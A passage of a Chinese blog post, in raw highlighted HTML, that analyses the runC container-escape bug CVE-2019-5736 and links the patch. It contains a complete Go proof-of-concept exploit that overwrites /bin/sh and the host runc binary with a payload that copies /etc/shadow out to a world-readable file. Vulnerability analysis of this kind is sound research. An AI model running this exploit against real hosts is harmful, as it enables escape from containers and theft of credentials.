class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">MkdirAll</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> <span class=\"token number\">0o700</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">,</span> err\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\tl <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>LinuxFactory<span class=\"token punctuation\">{</span>\n\t\tRoot<span class=\"token punctuation\">:</span>      root<span class=\"token punctuation\">,</span>\n\t\tInitPath<span class=\"token punctuation\">:</span>  <span class=\"token string\">\"/proc/self/exe\"</span><span class=\"token punctuation\">,</span>\n\t\tInitArgs<span class=\"token punctuation\">:</span>  <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">{</span>os<span class=\"token punctuation\">.</span>Args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"init\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n\t\tValidator<span class=\"token punctuation\">:</span> validate<span class=\"token punctuation\">.</span><span class=\"token function\">New</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n\t\tCriuPath<span class=\"token punctuation\">:</span>  <span class=\"token string\">\"criu\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> opt <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> options <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token keyword\">if</span> opt <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">continue</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">:=</span> <span class=\"token function\">opt</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">,</span> err\n\t\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> l<span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在接下来的过程中会调用该InitPath，并且参数为init，相当于执行了runC init命令，在该命令中采用cgo的形式导入C语言nstnter进行命名空间的设置：</p>\n<pre class=\"line-numbers language-go\" data-language=\"go\"><code class=\"language-go\"><span class=\"token keyword\">package</span> main\n\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"os\"</span>\n\t<span class=\"token string\">\"runtime\"</span>\n\t<span class=\"token string\">\"strconv\"</span>\n\n\t<span class=\"token string\">\"github.com/opencontainers/runc/libcontainer\"</span>\n\t<span class=\"token boolean\">_</span> <span class=\"token string\">\"github.com/opencontainers/runc/libcontainer/nsenter\"</span>\n\t<span class=\"token string\">\"github.com/sirupsen/logrus\"</span>\n<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">...</span><span class=\"token operator\">...</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>nsenter如下：</p>\n<pre class=\"line-numbers language-go\" data-language=\"go\"><code class=\"language-go\"><span class=\"token keyword\">package</span> nsenter\n\n<span class=\"token comment\">/*\n#cgo CFLAGS: -Wall\nextern void nsexec();\nvoid __attribute__((constructor)) init(void) {\n\tnsexec();\n}\n*/</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"C\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到调用了nsexec()函数，该函数在go runtime之前进行调用，函数的主要作用就是解析之前父进程发送的netlink格式的配置信息，然后通过设置usernamespace并创建子进程，然后子进程设置其他一些namespace并通过创建孙进程使相关namespaces生效，这个孙进程其实就是容器中的init进程，不过回想这个过程，runC通过cmd.Start()开启一个子进程执行runC init，在runC init的nsenter包执行过程中，会首先设置自己的user namespace和pid namespace，这就使得在该过程中容器内本身存在的进程可以发现runC进程，因此：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">void</span> <span class=\"token function\">nsexec</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">int</span> pipenum<span class=\"token punctuation\">;</span>\n\tjmp_buf env<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> syncpipe<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">struct</span> <span class=\"token class-name\">nlconfig_t</span> config <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token comment\">/*\n\t * If we don't have an init pipe, just return to the go routine.\n\t * We'll only get an init pipe for start or exec.\n\t */</span>\n\tpipenum <span class=\"token operator\">=</span> <span class=\"token function\">initpipe</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pipenum <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token comment\">/* Parse all of the netlink configuration. */</span>\n\t<span class=\"token function\">nl_parse</span><span class=\"token punctuation\">(</span>pipenum<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>config<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token comment\">/* clone(2) flags are mandatory. */</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>config<span class=\"token punctuation\">.</span>cloneflags <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token function\">bail</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"missing clone_flags\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token comment\">/* Pipe so we can tell the child when we've finished setting up. */</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">pipe</span><span class=\"token punctuation\">(</span>syncpipe<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token function\">bail</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to setup sync pipe between parent and child\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token comment\">/* Set up the jump point. */</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">setjmp</span><span class=\"token punctuation\">(</span>env<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> JUMP_VAL<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token comment\">/*\n\t\t * We're inside the child now, having jumped from the\n\t\t * start_child() code after forking in the parent.\n\t\t */</span>\n\t\t<span class=\"token class-name\">uint8_t</span> s <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">int</span> consolefd <span class=\"token operator\">=</span> config<span class=\"token punctuation\">.</span>consolefd<span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token comment\">/* Close the writing side of pipe. */</span>\n\t\t<span class=\"token function\">close</span><span class=\"token punctuation\">(</span>syncpipe<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token comment\">/* Sync with parent. */</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span>syncpipe<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> s <span class=\"token operator\">!=</span> SYNC_VAL<span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token function\">bail</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to read sync byte from parent\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">setsid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token function\">bail</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"setsid failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">setuid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token function\">bail</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"setuid failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">setgid</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token function\">bail</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"setgid failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">setgroups</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token function\">bail</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"setgroups failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>consolefd <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>consolefd<span class=\"token punctuation\">,</span> TIOCSCTTY<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\t\t\t\t<span class=\"token function\">bail</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ioctl TIOCSCTTY failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">dup3</span><span class=\"token punctuation\">(</span>consolefd<span class=\"token punctuation\">,</span> STDIN_FILENO<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> STDIN_FILENO<span class=\"token punctuation\">)</span>\n\t\t\t\t<span class=\"token function\">bail</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to dup stdin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">dup3</span><span class=\"token punctuation\">(</span>consolefd<span class=\"token punctuation\">,</span> STDOUT_FILENO<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> STDOUT_FILENO<span class=\"token punctuation\">)</span>\n\t\t\t\t<span class=\"token function\">bail</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to dup stdout\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">dup3</span><span class=\"token punctuation\">(</span>consolefd<span class=\"token punctuation\">,</span> STDERR_FILENO<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> STDERR_FILENO<span class=\"token punctuation\">)</span>\n\t\t\t\t<span class=\"token function\">bail</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"failed to dup stderr\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\n\t\t<span class=\"token comment\">/* Free netlink data. */</span>\n\t\t<span class=\"token function\">nl_free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>config<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token comment\">/* Finish executing, let the Go runtime take over. */</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token comment\">/* Run the parent code. */</span>\n\t<span class=\"token function\">start_child</span><span class=\"token punctuation\">(</span>pipenum<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>env<span class=\"token punctuation\">,</span> syncpipe<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>config<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token comment\">/* Should never be reached. */</span>\n\t<span class=\"token function\">bail</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"should never be reached\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>​        如果，在runc启动之前，容器内部的进程可以通过/proc/目录观察到runc相关的进程，那么就可以通过/proc/runc-pid/exe获得runc具体的路径，这个exe文件是Magic Link文件，这就意味着这个文件的打开过程是调用内核里面专门的处理函数，不是想普通的链接文件那样找到目标链接文件打开，这其实就帮助我们绕过了mnt命名空间和chroot对容器中文件系统资源的限制。</p>\n<p>​        如此我们就可以覆盖掉原本的runc二进制文件为我们的恶意代码，那么当用于下一次执行docker exec或者docker run之类需要调用runc的命令的时候就有可能会调用我们写入的恶意文件从而实现宿主机上面的恶意代码执行从而实现容器逃逸。</p>\n<h3 id=\"poc\"><a href=\"#poc\" class=\"headerlink\" title=\"poc\"></a>poc</h3><pre class=\"line-numbers language-go\" data-language=\"go\"><code class=\"language-go\"><span class=\"token keyword\">package</span> main\n\n<span class=\"token comment\">// Implementation of CVE-2019-5736</span>\n<span class=\"token comment\">// Created with help from @singe, @_cablethief, and @feexd.</span>\n<span class=\"token comment\">// This commit also helped a ton to understand the vuln</span>\n<span class=\"token comment\">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\"fmt\"</span>\n        <span class=\"token string\">\"io/ioutil\"</span>\n        <span class=\"token string\">\"os\"</span>\n        <span class=\"token string\">\"strconv\"</span>\n        <span class=\"token string\">\"strings\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">// This is the line of shell commands that will execute on the host</span>\n<span class=\"token keyword\">var</span> payload <span class=\"token operator\">=</span> <span class=\"token string\">\"#!/bin/bash \\n cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow\"</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// First we overwrite /bin/sh with the /proc/self/exe interpreter path</span>\n        fd<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Create</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n                fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">return</span>\n        <span class=\"token punctuation\">}</span>\n        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Fprintln</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"#!/proc/self/exe\"</span><span class=\"token punctuation\">)</span>\n        err <span class=\"token operator\">=</span> fd<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n                fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">return</span>\n        <span class=\"token punctuation\">}</span>\n        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Overwritten /bin/sh successfully\"</span><span class=\"token punctuation\">)</span>\n\n        <span class=\"token comment\">// Loop through all processes to find one whose cmdline includes runcinit</span>\n        <span class=\"token comment\">// This will be the process created by runc</span>\n        <span class=\"token keyword\">var</span> found <span class=\"token builtin\">int</span>\n        <span class=\"token keyword\">for</span> found <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n                pids<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> ioutil<span class=\"token punctuation\">.</span><span class=\"token function\">ReadDir</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/proc\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n                        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">return</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> f <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> pids <span class=\"token punctuation\">{</span>\n                        fbytes<span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">:=</span> ioutil<span class=\"token punctuation\">.</span><span class=\"token function\">ReadFile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/proc/\"</span> <span class=\"token operator\">+</span> f<span class=\"token punctuation\">.</span><span class=\"token function\">Name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"/cmdline\"</span><span class=\"token punctuation\">)</span>\n                        fstring <span class=\"token operator\">:=</span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span>fbytes<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">if</span> strings<span class=\"token punctuation\">.</span><span class=\"token function\">Contains</span><span class=\"token punctuation\">(</span>fstring<span class=\"token punctuation\">,</span> <span class=\"token string\">\"runc\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                                fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Found the PID:\"</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">.</span><span class=\"token function\">Name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                                found<span class=\"token punctuation\">,</span> err <span class=\"token operator\">=</span> strconv<span class=\"token punctuation\">.</span><span class=\"token function\">Atoi</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span><span class=\"token function\">Name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                                <span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n                                        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n                                        <span class=\"token keyword\">return</span>\n                                <span class=\"token punctuation\">}</span>\n                        <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token comment\">// We will use the pid to get a file handle for runc on the host.</span>\n        <span class=\"token keyword\">var</span> handleFd <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n        <span class=\"token keyword\">for</span> handleFd <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token comment\">// Note, you do not need to use the O_PATH flag for the exploit to work.</span>\n                handle<span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">OpenFile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/proc/\"</span><span class=\"token operator\">+</span>strconv<span class=\"token punctuation\">.</span><span class=\"token function\">Itoa</span><span class=\"token punctuation\">(</span>found<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"/exe\"</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>O_RDONLY<span class=\"token punctuation\">,</span> <span class=\"token number\">0777</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">if</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>handle<span class=\"token punctuation\">.</span><span class=\"token function\">Fd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n                        handleFd <span class=\"token operator\">=</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>handle<span class=\"token punctuation\">.</span><span class=\"token function\">Fd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Successfully got the file handle\"</span><span class=\"token punctuation\">)</span>\n\n        <span class=\"token comment\">// Now that we have the file handle, lets write to the runc binary and overwrite it</span>\n        <span class=\"token comment\">// It will maintain it's executable flag</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span>\n                writeHandle<span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">OpenFile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/proc/self/fd/\"</span><span class=\"token operator\">+</span>strconv<span class=\"token punctuation\">.</span><span class=\"token function\">Itoa</span><span class=\"token punctuation\">(</span>handleFd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>O_WRONLY<span class=\"token operator\">|</span>os<span class=\"token punctuation\">.</span>O_TRUNC<span class=\"token punctuation\">,</span> <span class=\"token number\">0700</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">if</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>writeHandle<span class=\"token punctuation\">.</span><span class=\"token function\">Fd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n                        fmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Successfully got write handle\"</span><span class=\"token punctuation\">,</span> writeHandle<span class=\"token punctuation\">)</span>\n                        writeHandle<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token function\">byte</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">return</span>\n                <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>POC思路：</p>\n<ol>\n<li>首先覆盖容器中的/bin/sh为#!/proc/self/exe。</li>\n<li>遍历/proc下的目录找到runC相关进程</li>\n<li>打开/proc下相关的exe文件获得fd</li>\n<li>循环写入 fd，直到runC解除占用，成功写入</li>\n<li>runc最后将执行用户通过docker exec指定的/bin/sh，它的内容在第1步中已经被替换成#!/proc/self/exe，因此实际上将执行宿主机上的runc，而runc也已经在第4部中被我们覆盖掉了。</li>\n</ol>\n<h2 id=\"漏洞补丁\"><a href=\"#漏洞补丁\" class=\"headerlink\" title=\"漏洞补丁\"></a>漏洞补丁</h2><p>具体补丁详情：<a href=\"https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d\">https://github.com/opencontainers/runc/commit/6635b4f0c6af3810594d2770f662f34ddc15b40d</a></p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">void</span> <span class=\"token function\">nsexec</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">int</span> pipenum<span class=\"token punctuation\">;</span>\n\t@@ <span class=\"token operator\">-</span><span class=\"token number\">549</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span> <span class=\"token operator\">+</span><span class=\"token number\">552</span><span class=\"token punctuation\">,</span><span class=\"token number\">14</span> @@ <span class=\"token keyword\">void</span> <span class=\"token function\">nsexec</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pipenum <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t\t<span 